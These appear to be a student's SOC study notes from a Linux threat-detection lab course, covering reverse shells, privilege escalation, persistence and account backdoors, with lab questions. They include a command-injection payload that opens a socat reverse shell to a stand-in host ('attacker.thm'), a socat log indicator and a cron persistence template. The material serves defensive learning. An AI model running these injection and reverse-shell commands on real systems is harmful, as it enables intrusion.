<img width="1470" height="956" alt="Screenshot 2026-02-28 at 11 32 08 AM" src="https://github.com/user-attachments/assets/5a486492-a0f7-4c4b-a868-40b12c4a0a55" /># Attack Convenience & Reverse Shell (Linux SOC Notes)

## 1. Problem with Exploit-Based Access

When attackers gain access through:

- web vulnerabilities
- command injection
- service exploits

They often do NOT get a full terminal.

Limitations include:
- broken output
- no Ctrl+C support
- command delays
- timeouts
- restricted environment


---

## 2. What is a Reverse Shell?

A reverse shell is when:

The victim system connects back to the attacker
and opens a command shell.

Normal connection:
Attacker → Victim

Reverse shell:
Victim → Attacker

This gives the attacker a stable, full terminal.


---

## 3. Why Attackers Use Reverse Shells

Reverse shells provide:

- interactive terminal
- better command control
- stable session
- full attack continuation

It is often required after web exploitation.


---

## 4. Common Reverse Shell Methods

### A. Bash Reverse Shell
Uses built-in bash networking features
to connect to attacker IP and port.

### B. Socat Reverse Shell
More stable method.
Common log indicator:
socat TCP:<attackerIP>:<port> EXEC:bash

### C. Python Reverse Shell
Uses Python to create socket connection
and spawn bash shell.


---

## 5. SOC Detection Importance

Reverse shell = Critical alert.

It indicates:
- system already breached
- human attacker active


---

## 6. Detecting Reverse Shell with Auditd

Step 1:
Search for suspicious commands like:
socat
bash
python

Step 2:
Check process details (PID and PPID).

Step 3:
Build process tree to trace origin.


---

## 7. Example Investigation Flow

Detected:
socat TCP:10.20.20.20:2525 EXEC:bash

Parent process:
 /bin/sh -c socat ...

Origin process:
 /usr/bin/python3 /opt/trypingme/main.py

Conclusion:
Reverse shell created through vulnerable web app.


---

## 8. Activity After Reverse Shell

Attackers usually run:

id
uname -a
ls -la

These are Discovery commands.


---

## 9. Detection Indicators

- Outbound connection to unknown IP
- socat or python spawning bash
- web application launching shell
- unusual network traffic to attacker IP


---
## Lab Questions
### Q.1 Run 127.0.0.1 && whoami in the TryPingMe web app. What output do you see after the ping results?
<img width="1470" height="956" alt="Screenshot 2026-02-25 at 11 02 31 PM" src="https://github.com/user-attachments/assets/c4247ffe-df21-4687-aa02-502ddb15511e" />
### Q.2 Now try spawning a reverse shell to the imaginary "attacker.thm" address. Run 127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh in the web app. What is the flag returned in the TryPingMe response?
<img width="1470" height="956" alt="Screenshot 2026-02-25 at 11 04 52 PM" src="https://github.com/user-attachments/assets/6ecb942d-60d6-4856-b92e-c79d2a636c36" />
### Q.3 Now look at the exported auditd logs at /home/ubuntu/scenario.Which IP spawned a similar reverse shell via the TryPingMe app?
<img width="1470" height="956" alt="Screenshot 2026-02-25 at 11 05 35 PM" src="https://github.com/user-attachments/assets/1dfc2f85-361f-4591-8a3d-fdecd167643e" />


## 10. One Line Summary

A reverse shell allows attackers to gain
a stable interactive terminal after exploitation,
and it is a strong indicator of active compromise.

---
# Privilege Escalation Basics 

## 1. What is Privilege Escalation?

Privilege Escalation happens when an attacker
moves from a low-privileged user to a higher
privileged account such as root.

Example:
www-data → root


---

## 2. Why Privilege Escalation is Needed?

Initial access often provides limited permissions.

Low-privilege users may:
- access only specific folders
- lack permission to install malware
- be unable to read sensitive files

Attackers escalate privileges
to gain full system control.


---

## 3. Common Privilege Escalation Methods

### A. Exploiting Old Software

Discovery shows outdated OS or kernel.

Attacker downloads and runs exploit.

Example:
Download and execute PwnKit exploit.


---

### B. SUID Misconfiguration Abuse

SUID binaries run with root privileges.

If misconfigured,
attackers execute shell as root.

Example logic:
Use vulnerable binary to spawn root shell.


---

### C. Exposed SSH Keys

Unprotected private SSH keys found.

Attacker logs in directly as root
without password.


---

## 4. Detection Challenges

There are many privilege escalation techniques.

SOC teams usually detect:
- suspicious surrounding activity
- abnormal command behavior
instead of specific exploit details.


---

## 5. Typical Attack Pattern

### Step 1: Discovery Activity
Commands executed:
whoami
id
ps
uname

Used to identify system weaknesses.


---

### Step 2: Exploit Download

Suspicious file downloaded to temporary directory.

Example indicators:
- download to /tmp
- source code or exploit files


---

### Step 3: Exploit Execution

Exploit compiled and executed.

Example behavior:
- file made executable
- binary executed from /tmp


---

### Step 4: Privilege Change

Before exploit:
whoami → low privilege user

After exploit:
whoami → root

Indicates successful privilege escalation.


---

### Step 5: Post-Escalation Actions

Attacker may:
- archive sensitive data
- access restricted folders
- exfiltrate files using SCP


---

## 6. Detection Using Auditd

Check:
- exploit execution events
- parent process relationships
- UID changes in process tree


---

## 7. Key Detection Indicator

If process starts as normal user
and spawns a root shell,
privilege escalation likely occurred.


---
## Lab Questions 
### Q.1 Which command line was used to look for the "pass" keyword in files?
<img width="1429" height="135" alt="Screenshot 2026-02-27 at 10 43 40 PM" src="https://github.com/user-attachments/assets/b785e5a4-37f6-4f93-8dc0-448a2a0d6c9c" />
### Q.2 Which command line was used to escalate privileges to root?
<img width="1018" height="49" alt="Screenshot 2026-02-27 at 10 47 30 PM" src="https://github.com/user-attachments/assets/f04c9b71-9050-48fe-b02b-c40203933d4b" />


## 8. One Line Summary

Privilege escalation allows attackers
to move from limited access to root control
by exploiting vulnerabilities or misconfigurations.

---


# Persistence in Linux (SOC Notes)

## 1. What is Persistence?

Persistence allows attackers to maintain
access to a system even after reboot
or service restart.

Goal:
Ensure malware runs automatically
without attacker reconnecting.


---

## 2. Why Persistence is Important?

Linux servers often run for long periods
without reboot.

Attackers create backdoors so that:

System reboot
      ↓
Malware starts again automatically


---

## 3. Common Linux Persistence Methods

### A. Cron Job Persistence

Cron jobs are scheduled tasks in Linux.

Attackers add malicious commands
to cron configuration files.

Example behavior:
Run malware automatically at reboot
or at fixed time intervals.


---

### Example Persistence Technique

@reboot <malware-command>

Meaning:
Malware executes every time
the system starts.


---

### Reinstallation Technique

Attackers may schedule malware download
every few minutes.

Purpose:
Restore malware if deleted.


---

## 4. Systemd Service Persistence

Systemd manages system services.

Attackers create fake service files
that execute malware on startup.

Service file locations:

/lib/systemd/system/
/etc/systemd/system/


---

### Malicious Service Example

Fake service name:
cloud-online.service

ExecStart runs hidden malware.


---

## 5. Detecting Persistence

Persistence files are text-based,
so file monitoring is effective.


---

## 6. Monitor Cron Locations

/etc/crontab
/etc/cron.d/*
/var/spool/cron/*
/var/spool/crontab/*


---

## 7. Monitor Systemd Locations

/lib/systemd/system/*
/etc/systemd/system/*


---

## 8. Suspicious Processes to Monitor

crontab -e
systemctl enable <service>
systemctl start <service>
nano or vi editing cron/systemd files


---

## 9. Detection Using Auditd

Look for:

- creation of new .service files
- modification of cron jobs
- root user editing startup configurations


---

## 10. SOC Detection Logic

Privilege escalation
        ↓
Cron or systemd modification
        ↓
Automatic malware execution
        ↓
Persistence established


---
## Lab Questions 
### Q.1 What flag did you get after running the malware persisting as a service?
- here we got two files that look suspicious 
<img width="1462" height="736" alt="Screenshot 2026-02-28 at 11 28 39 AM" src="https://github.com/user-attachments/assets/8bbf62cf-cf73-4c45-b698-bbf6befcaf02" />
<img width="1470" height="956" alt="Screenshot 2026-02-28 at 11 29 29 AM" src="https://github.com/user-attachments/assets/3262014f-6b8e-442d-be51-142d998cc018" />
<img width="1470" height="956" alt="Screenshot 2026-02-28 at 11 32 20 AM" src="https://github.com/user-attachments/assets/9212a0d7-8a48-494d-bf60-d3db83b23149" />

### Q.2 What flag did you get after running the malware persisting as a cron job?
- using command crontab -e
<img width="1470" height="956" alt="Screenshot 2026-02-28 at 12 44 00 PM" src="https://github.com/user-attachments/assets/b5d1d04d-7e4d-4d11-9e5f-052abd6adea3" />
<img width="1470" height="956" alt="Screenshot 2026-02-28 at 12 46 55 PM" src="https://github.com/user-attachments/assets/55452956-818c-4187-b262-7bcf55936587" />
---
## 11. One Line Summary

Linux persistence allows attackers
to automatically run malware after reboot
using cron jobs or systemd services.

---

# Account Persistence (Linux SOC Notes)

## 1. What is Account Persistence?

Account persistence allows attackers
to maintain future access to a system
without leaving malware behind.

Goal:
Return to the system anytime
using legitimate authentication methods.


---

## 2. Method 1: New User Account Creation

Attackers create a new system user
and grant administrative privileges.

Typical actions:
- create new user account
- assign home directory
- add user to sudo group

Result:
Attacker can log in later via SSH.


---

### Detection

Check authentication logs:

/var/log/auth.log

Look for:
useradd
usermod

Suspicious indicator:
New user added to sudo group.


---

## 3. Method 2: SSH Key Backdoor

Attackers add their public SSH key
to an existing user account.

File used:
~/.ssh/authorized_keys

Purpose:
Login without password authentication.


---

### Why This Is Dangerous

- malicious keys blend with legitimate ones
- difficult to visually identify
- attacker gains silent access


---

### Detection

Monitor changes to:

~/.ssh/authorized_keys

Using auditd:

ausearch -i -f authorized_keys

Note:
Shell built-in commands like echo
may appear only as "bash" in logs.


---

## 4. Method 3: Application-Level Persistence

Attackers compromise applications
such as web servers or CMS platforms.

Example:
Upload web shell through admin panel.

Access maintained through application
instead of OS-level access.


---

### Detection Challenge

System logs may show no alerts.

If malware repeatedly reappears,
public-facing applications should be investigated.


---

## 5. SOC Detection Strategy

Monitor:
- new user creation events
- privilege group modifications
- SSH key file changes
- unexpected application behavior


---

## 6. Attack Flow Example

Initial access gained
        ↓
New user or SSH key added
        ↓
Malware removed
        ↓
Attacker retains long-term access


---
## Lab Questions 
### Q.1 Which user was created and added to the sudo group?
<img width="1444" height="149" alt="Screenshot 2026-02-28 at 12 59 41 PM" src="https://github.com/user-attachments/assets/d884f4bb-687e-4aca-9f9a-07521edde725" />

### Q.2 Which file was changed to allow SSH key persistence?
<img width="1468" height="526" alt="Screenshot 2026-02-28 at 1 01 39 PM" src="https://github.com/user-attachments/assets/7b589dea-bfba-4b27-9065-6d7d8b86862c" />



## 7. One Line Summary

Account persistence allows attackers
to maintain hidden long-term access
using user accounts or SSH key backdoors.

---
# Targeted Attacks (Linux SOC Notes)

## 1. What are Targeted Attacks?

Targeted attacks focus on
specific organizations,
companies, or governments.

Unlike automated attacks,
attackers carefully choose victims.

Goals may include:
- espionage
- ransomware
- data theft
- infrastructure control


---

## 2. Hack & Forget vs Targeted Attacks

Hack & Forget:
- automated attacks
- random victims
- short-term access
- cryptominers or botnets

Targeted Attacks:
- human-operated
- specific victims
- long-term presence
- high business impact


---

## 3. Linux as Entry Point

Linux systems often host
Internet-facing services:

- web servers
- firewalls
- VPN gateways
- mail servers

Compromising one Linux server
can provide access to the
entire corporate network.


---

## 4. Attack Movement Example

Internet
      ↓
Compromised Linux Server
      ↓
Internal Network Access
      ↓
Organization-wide compromise


---

## 5. Linux in Espionage Campaigns

APT groups frequently target Linux systems.

Example behavior:
- breach critical Linux server
- install backdoor
- establish persistence using systemd service
- maintain long-term access

Malicious services often use
legitimate-looking names.


---

## 6. Linux in Ransomware Attacks

Linux hypervisors are prime targets.

Hypervisor:
A Linux system hosting multiple virtual machines.

If compromised:
- attacker encrypts all hosted VMs
- organization operations stop


---

## 7. SOC Analyst Importance

Linux servers are fewer in number
but highly critical assets.

Protecting Linux infrastructure
helps protect the entire network.


---

## 8. Threat Detection Recap

Key techniques learned:

- Initial Access detection
- Discovery monitoring
- Reverse shell detection
- Privilege escalation detection
- Persistence identification
- Account backdoor detection
- Malware execution tracking


---

## 9. One Line Summary

Targeted attacks use compromised Linux systems
as entry points to maintain long-term access
and cause large-scale organizational impact.
